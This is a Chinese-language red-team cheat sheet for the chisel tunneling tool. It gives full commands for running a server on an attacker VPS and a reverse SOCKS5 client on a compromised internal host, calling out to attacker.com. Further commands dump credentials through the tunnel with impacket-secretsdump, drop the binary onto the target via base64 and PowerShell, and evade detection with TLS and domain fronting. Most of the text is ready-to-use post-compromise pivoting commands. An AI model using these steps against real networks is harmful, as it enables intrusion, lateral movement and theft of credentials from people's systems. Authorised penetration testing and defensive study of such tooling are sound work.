# chisel 基础用法

chisel 是 Go 写的 TCP/UDP 隧道工具，把流量套在 HTTP/HTTPS 里穿越大多数防火墙。最常见用途是**反向连接**：从内网受控机连出来到攻击机，再通过这个隧道访问内网其它资源。

## 安装

```bash
brew install chisel                                                    # macOS
go install github.com/jpillora/chisel@latest
# 或下载 release：https://github.com/jpillora/chisel/releases
```

验证：

```bash
chisel --version
```

## 角色与方向

| 角色 | 跑在哪 |
|---|---|
| **server** | 攻击机 / 公网 VPS（外暴露 HTTP 端口） |
| **client** | 受控机 / 内网（主动连出 server） |

注意：流量方向 ≠ 角色方向。client 也能开 forward / reverse 通道。

## 启 server（攻击机）

```bash
chisel server --port 8080 --reverse
```

`--reverse` 必加，否则 client 不能请求反向通道。

加认证：

```bash
chisel server --port 8080 --reverse --auth user:secret
```

加 TLS：

```bash
chisel server --port 8443 --reverse \
  --tls-cert cert.pem --tls-key key.pem
```

## 启 client（受控机）

最常见：**SOCKS5 反向代理**（让攻击机像在内网里）

```bash
chisel client http://attacker.com:8080 R:1080:socks
```

然后攻击机本地 :1080 是个 SOCKS5 代理：

```bash
proxychains4 nmap -sT 192.168.99.10
# 或
curl --socks5 127.0.0.1:1080 http://192.168.99.10
```

## 端口转发模式速查

| client 写法 | 含义 |
|---|---|
| `R:1080:socks` | 反向 SOCKS5（最常用） |
| `R:8000:127.0.0.1:80` | 受控机 :80 → 攻击机 :8000 |
| `R:0.0.0.0:8000:127.0.0.1:80` | 同上但 0.0.0.0 监听 |
| `9000:192.168.99.10:80` | 攻击机 :9000 → 受控机 → 内网 :80（forward） |
| `9000:socks` | 攻击机 :9000 起 SOCKS5（流量从 server 出） |

## 反向 vs 前向

```
前向（forward）：attacker → chisel client → 内网目标
反向（reverse, R:）：内网目标 → chisel client → attacker 监听
```

红队最常用 **R:1080:socks** —— 只需上传一个 chisel 二进制，就能完成内网访问。

## 完整工作流：内网渗透

1. **攻击机（公网 VPS）**：
   ```bash
   chisel server --port 80 --reverse --auth red:Pass123
   ```

2. **受控机（内网）**：
   ```bash
   chisel client --auth red:Pass123 http://attacker.com:80 R:1080:socks
   ```

3. **攻击机本地用 SOCKS 访问内网**：
   ```bash
   proxychains4 nxc smb 192.168.99.0/24 -u admin -p Pass
   proxychains4 impacket-secretsdump LAB/admin:Pass@192.168.99.10
   ```

## 反向暴露内网 Web

```bash
# attacker
chisel server --port 8080 --reverse

# victim（10.0.0.5 上）—— 把内网 web 192.168.99.50:80 转出来
chisel client http://attacker.com:8080 R:9000:192.168.99.50:80

# attacker 浏览器
http://localhost:9000
```

## 多通道组合

```bash
chisel client http://attacker:8080 \
  R:1080:socks \
  R:3389:192.168.99.5:3389 \
  R:5985:192.168.99.5:5985
```

一次性开 SOCKS + 单独的 RDP / WinRM 端口转发。

## TLS + 自签证书

server 开 https：

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=attacker"
chisel server --port 443 --tls-cert cert.pem --tls-key key.pem --reverse
```

client 跳过验证：

```bash
chisel client --tls-skip-verify https://attacker:443 R:1080:socks
```

## 把 chisel 嵌入工作流

```bash
# 把 chisel 二进制 base64 → 用 PowerShell 落地到目标
base64 -i chisel.exe -o chisel.b64
# 在受控机：
[IO.File]::WriteAllBytes("chisel.exe",[Convert]::FromBase64String($(Get-Content chisel.b64)))
.\chisel.exe client http://attacker:8080 R:1080:socks
```

## 常见坑

- 没加 `--reverse` 时 client 的 `R:` 通道会被 server 拒绝
- 公司网关 deep packet inspection 时纯 HTTP 容易被识别 → 走 TLS + 443 + 真实证书
- SOCKS 通道里丢失 UDP（默认 SOCKS5 不支持 UDP）→ 重要 UDP 走专用 forward
- chisel 没有自动重连，进程退出就断 → 包一层 systemd / nohup loop
- 现代防火墙 / 代理识别 chisel 协议 fingerprint 越来越多，敏感场景配合 cloudflare / domain fronting
